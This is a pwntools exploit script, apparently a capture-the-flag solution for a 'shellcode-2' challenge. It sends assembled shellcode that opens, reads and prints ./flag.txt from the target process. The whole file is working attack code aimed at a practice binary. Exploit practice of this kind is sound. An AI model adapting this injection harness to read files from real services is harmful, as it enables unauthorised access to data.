#!/usr/bin/env python3

from pwn import *

elf = ELF("./shellcode-2")

HOST, PORT = "localhost", 5001

context.binary = elf
context.terminal = ["tmux", "splitw", "-h", "-p", "75"]

MAXSIZE = 200

def main():
    global io
    io = conn()

    io.recvuntil("Enter your shellcode : ")

    RWBUF = 0x601800
    READSIZE = 0x100

    shellcode = asm(
        shellcraft.open("./flag.txt", 0) +
        shellcraft.read("rax", RWBUF, READSIZE) +
        shellcraft.write(1, RWBUF, READSIZE)
    )
    assert(len(shellcode) <= MAXSIZE)

    io.send(shellcode)

    io.interactive()

def conn():
    gdbscript = '''
    '''
    if args.REMOTE:
        p = remote(HOST, PORT)
    elif args.GDB:
        p = gdb.debug(elf.path, gdbscript=gdbscript)
    else:
        p = process(elf.path)

    return p

if __name__ == "__main__":
    io = None
    try:
        main()
    finally:
        if io:
            io.close()
